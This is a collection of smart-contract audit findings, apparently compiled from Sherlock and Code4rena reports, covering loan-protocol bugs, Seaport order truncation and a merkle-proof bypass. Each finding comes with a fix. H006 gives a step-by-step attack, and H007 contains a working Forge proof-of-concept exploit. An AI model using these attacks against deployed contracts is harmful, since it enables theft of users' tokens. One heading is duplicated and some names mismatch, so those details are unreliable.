# High Risk Issues

## H001 - Unsafe ERC20 Operation(s)

### Description


ERC20 operations can present security challenges due to variations 
in their implementations and potential vulnerabilities within the standard. 
For a tech-savvy audience, it's essential to address these concerns.

It is therefore recommended to always either use OpenZeppelin's `SafeERC20`
library or at least to wrap each operation in a `require` statement.

To circumvent ERC20's `approve` functions race-condition vulnerability use
OpenZeppelin's `SafeERC20` library's `safe{Increase|Decrease}Allowance`
functions.

In case the vulnerability is of no danger for your implementation, provide
enough documentation explaining the reasonings.

### Example

🤦 Bad:
```solidity
IERC20(token).transferFrom(msg.sender, address(this), amount);
```

🚀 Good (using OpenZeppelin's `SafeERC20`):
```solidity
import {SafeERC20} from "openzeppelin/token/utils/SafeERC20.sol";

// ...

IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
```

🚀 Good (using `require`):
```solidity
bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
require(success, "ERC20 transfer failed");
```

### Background Information

- [OpenZeppelin's IERC20 documentation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol#L43)


## H002 - Loans can be rolled an unlimited number of times

### Description

Loans can be rolled an unlimited number of times, without letting the lender decide if has been done too many times already.

The lender is expected to be able to toggle whether a loan can be rolled or not, but once it's enabled, there is no way to prevent the borrower from rolling an unlimited number of times in the same transaction or in quick succession.

If the lender is giving an interest-free loan and assumes that allowing a roll will only extend the term by one, they'll potentially be forced to wait until the end of the universe if the borrower chooses to roll an excessive number of times.

If the borrower is using a quickly-depreciating collateral, the lender may be happy to allow one a one-term extension, but will lose money if the term is rolled multiple times and the borrower defaults thereafter.

The initial value of loan.rollable is always true, so unless the lender calls toggleRoll() in the same transaction that they call clear(), a determined attacker will be able to roll as many times as they wish.

### Example

🤦 Bad:
```solidity
141    
142            loan.amount += newDebt;
143            loan.expiry += req.duration;
144            loan.collateral += newCollateral;
145            
147:       }
```

🚀 Good:
```solidity
+   loan.rollable = false;
    loan.amount += newDebt;
    loan.expiry += req.duration;
    loan.collateral += newCollateral;
```

### Background Information

https://github.com/sherlock-audit/2023-01-cooler-judging#issue-h-2-loans-can-be-rolled-an-unlimited-number-of-times


## H003 - Fully repaying a loan will result in debt payment being lost

### Description

When a loan is fully repaid the loan storage is deleted. Since loan is a storage reference to the loan, loan.lender will return address(0) after the loan has been deleted. This will result in the debt being transferred to address(0) instead of the lender. Some ERC20 tokens will revert when being sent to address(0) but a large number will simply be sent there and lost forever.

In Cooler#repay the loan storage associated with the loanID being repaid is deleted. loan is a storage reference so when loans[loanID] is deleted so is loan. The result is that loan.lender is now address(0) and the loan payment will be sent there instead.

### Example

🤦 Bad:
```solidity

    if (repaid == loan.amount) delete loans[loanID];
    else {
        loan.amount -= repaid;
        loan.collateral -= decollateralized;
    }

```

🚀 Good:
```solidity
-   if (repaid == loan.amount) delete loans[loanID];
+   if (repaid == loan.amount) {
+       debt.transferFrom(msg.sender, loan.lender, loan.amount);
+       collateral.transfer(owner, loan.collateral);
+       delete loans[loanID];
+       return;
+   }
```

### Background Information

https://github.com/sherlock-audit/2023-01-cooler-judging#issue-h-3-fully-repaying-a-loan-will-result-in-debt-payment-being-lost


## H004 - Lender force Loan become default

### Description

in repay() directly transfer the debt token to Lender, but did not consider that Lender can not accept the token (in contract blacklist), resulting in repay() always revert, and finally the Loan can only expire, Loan be default.

The only way for the borrower to get the collateral token back is to repay the amount owed via repay(). Currently in the repay() method transfers the debt token directly to the Lender. This has a problem: if the Lender is blacklisted by the debt token now, the debtToken.transferFrom() method will fail and the repay() method will always fail and finally the Loan will default. Example: Assume collateral token = ETH,debt token = USDC, owner = alice 1.alice call request() to loan 2000 usdc , duration = 1 mon 2.bob call clear(): loanID =1 3.bob transfer loan[1].lender = jack by Cooler.approve/transfer
Note: jack has been in USDC's blacklist for some reason before or bob in USDC's blacklist for some reason now, it doesn't need transfer 'lender') 4.Sometime before the expiration date, alice call repay(id=1) , it will always revert, Because usdc.transfer(jack) will revert 5.after 1 mon, loan[1] default, jack call defaulted() get collateral token

Lender forced Loan become default for get collateral token, owner lost collateral token

### Example

🤦 Bad:
```solidity
 debt.transferFrom(msg.sender, loan.lender, repaid);
```

🚀 Good:
```solidity
mapping(address => uint) repayedAmount;

function claimRepayedAmount() external {
    debt.safeTransfer(msg.sender, repayedAmount);
    repayedAmount[msg.sender] = 0;
}
```


## H005 - Setting new controller can break YVaultLPFarming

### Description

The accruals in yVaultLPFarming will fail if currentBalance < previousBalance in _computeUpdate.

### POC

🤦 Bad:
```solidity
 currentBalance = vault.balanceOfJPEG() + jpeg.balanceOf(address(this));
uint256 newRewards = currentBalance - previousBalance;
```

No funds can be withdrawn anymore as the withdraw functions first trigger an _update.

The currentBalance < previousBalance case can, for example, be triggerd by decreasing the vault.balanceOfJPEG() due to calling yVault.setController:

🚀 @audit:
```solidity
function setController(address _controller) public onlyOwner {
    // @audit can reduce balanceofJpeg which breaks other masterchef contract
    require(_controller != address(0), "INVALID_CONTROLLER");
    controller = IController(_controller);
}

function balanceOfJPEG() external view returns (uint256) {
    // @audit new controller could return a smaller balance
    return controller.balanceOfJPEG(address(token));
}
```

### Background Information

- [Chemical - w2](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80)

## H006 - Truncation in OrderValidator can lead to resetting the fill and selling more tokens

### Vulnerability details
#### Impact

A partial order's fractions (numerator and denominator) can be reset to 0 due to a truncation. This can be used to craft malicious orders:
    1. Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the 'marketplaceContract'.
    2. Alice places a PARTIAL_OPEN order with 10 ERC1155 tokens and consideration of ETH.
    3. Malory tries to fill the order in the following way:
       1. Malory tries to fill 50% of the order, but instead of providing the fraction 1 / 2, Bob provides 2**118 / 2**119. This sets the totalFilled to 2**118 and totalSize to 2**119.
       2. Malory tries to fill 10% of the order, by providing 1 / 10. The computation 2**118 / 2**119 + 1 / 10 is done by "cross multiplying" the denominators, leading to the acutal fraction being numerator = (2**118 * 10 + 2**119) and denominator = 2**119 * 10.
       3. Because of the uint120 truncation in OrderValidator.sol#L228-L248, the numerator and denominator are truncated to 0 and 0 respectively.
       4. Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!

### Proof of Concept

For a full POC: https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409

The following change would make the above POC fail:

🤦 POC:
```solidity
 modified   contracts/lib/OrderValidator.sol
@@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {
                 // Update order status and fill amount, packing struct values.
                 _orderStatus[orderHash].isValidated = true;
                 _orderStatus[orderHash].isCancelled = false;
+                require(filledNumerator + numerator <= type(uint120).max, "overflow");
+                require(denominator <= type(uint120).max, "overflow");
                 _orderStatus[orderHash].numerator = uint120(
                     filledNumerator + numerator
                 );
@@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {
             // Update order status and fill amount, packing struct values.
             _orderStatus[orderHash].isValidated = true;
             _orderStatus[orderHash].isCancelled = false;
+            require(numerator <= type(uint120).max, "overflow");
+            require(denominator <= type(uint120).max, "overflow");
             _orderStatus[orderHash].numerator = uint120(numerator);
             _orderStatus[orderHash].denominator = uint120(denominator);
         }
```

### Tools Used

Manual review

### Recommended Mitigation Steps

A basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and require more changes to fully fix it. See a related issue: "A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone" that points out a related but a more fundamental issue with the mechanism.

### Background Information

- [Chemical - w2](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77)

## H007 - Setting new controller can break YVaultLPFarming

### Description
#### Impact

The protocol allows specifying several tokenIds to accept for a single offer.
A merkle tree is created out of these tokenIds and the root is stored as the identifierOrCriteria for the item.
The fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.

There are no real verifications on the merkle proof that the supplied tokenId is indeed a leaf of the merkle tree.
It's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.

This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria.
Usually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.

Example
Alice wants to buy either NFT with tokenId 1 or tokenId 2.
She creates a merkle tree of it and the root is hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0.
She creates an offer for this criteria.
An attacker can now acquire the NFT with tokenId 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0 (or, generally, any other intermediate hash value) and fulfill the trade.

>One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard.
>
>"While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'." EIP721
>
>Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal _mint(address to, uint256 id) functions that allow specifying an arbitrary id. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions.
Therefore, ERC721-compliant token contracts are vulnerable to this attack.

### Proof of Concept

Here's a forge test (gist) that shows the issue for the situation mentioned in Example.

🚀 @audit:
```solidity
 contract BugMerkleTree is BaseOrderTest {
    struct Context {
        ConsiderationInterface consideration;
        bytes32 tokenCriteria;
        uint256 paymentAmount;
        address zone;
        bytes32 zoneHash;
        uint256 salt;
    }

    function hashHashes(bytes32 hash1, bytes32 hash2)
        internal
        returns (bytes32)
    {
        // see MerkleProof.verify
        bytes memory encoding;
        if (hash1 <= hash2) {
            encoding = abi.encodePacked(hash1, hash2);
        } else {
            encoding = abi.encodePacked(hash2, hash1);
        }
        return keccak256(encoding);
    }

    function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {
        // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree
        bytes32 leafLeft = bytes32(uint256(1));
        bytes32 leafRight = bytes32(uint256(2));
        bytes32 merkleRoot = hashHashes(leafLeft, leafRight);
        console.logBytes32(merkleRoot);

        Context memory context = Context(
            consideration,
            merkleRoot, /* tokenCriteria */
            1e18, /* paymentAmount */
            address(0), /* zone */
            bytes32(0), /* zoneHash */
            uint256(0) /* salt */
        );
        bytes32 conduitKey = bytes32(0);

        token1.mint(address(alice), context.paymentAmount);
        // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable
        // we acquire the merkle root ID
        test721_1.mint(address(this), uint256(merkleRoot));

        _configureERC20OfferItem(
            // start, end
            context.paymentAmount, context.paymentAmount
        );
        _configureConsiderationItem(
            ItemType.ERC721_WITH_CRITERIA,
            address(test721_1),
            // @audit set merkle root for NFTs we want to accept
            uint256(context.tokenCriteria), /* identifierOrCriteria */
            1,
            1,
            alice
        );

        OrderParameters memory orderParameters = OrderParameters(
            address(alice),
            context.zone,
            offerItems,
            considerationItems,
            OrderType.FULL_OPEN,
            block.timestamp,
            block.timestamp + 1000,
            context.zoneHash,
            context.salt,
            conduitKey,
            considerationItems.length
        );

        OrderComponents memory orderComponents = getOrderComponents(
            orderParameters,
            context.consideration.getNonce(alice)
        );
        bytes32 orderHash = context.consideration.getOrderHash(orderComponents);
        bytes memory signature = signOrder(
            context.consideration,
            alicePk,
            orderHash
        );

        delete offerItems;
        delete considerationItems;

        /*************** ATTACK STARTS HERE ***************/
        AdvancedOrder memory advancedOrder = AdvancedOrder(
            orderParameters,
            1, /* numerator */
            1, /* denominator */
            signature,
            ""
        );

        // resolve the merkle root token ID itself
        CriteriaResolver[] memory cr = new CriteriaResolver[](1);
        bytes32[] memory proof = new bytes32[](0);
        cr[0] = CriteriaResolver(
              0, // uint256 orderIndex;
              Side.CONSIDERATION, // Side side;
              0, // uint256 index; (item)
              uint256(merkleRoot), // uint256 identifier;
              proof // bytes32[] criteriaProof;
        );

        uint256 profit = token1.balanceOf(address(this));
        context.consideration.fulfillAdvancedOrder{
            value: context.paymentAmount
        }(advancedOrder, cr, bytes32(0));
        profit = token1.balanceOf(address(this)) - profit;

        // @audit could fulfill order without owning NFT 1 or 2
        assertEq(profit, context.paymentAmount);
    }
}
```

### Recommended Mitigation Steps

Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a leaf or not.
An elegant fix here is to simply use hashes of the tokenIds as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.)
Then compute the leaf hash in the contract from the provided tokenId:

```solidity
function _verifyProof(
    uint256 leaf,
    uint256 root,
    bytes32[] memory proof
) internal pure {
    bool isValid;

-    assembly {
-        let computedHash := leaf
+  bytes32 computedHash = keccak256(abi.encodePacked(leaf))
  ...
```

here can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.

Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)

### Background Information

- [Chemical - w2](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168)
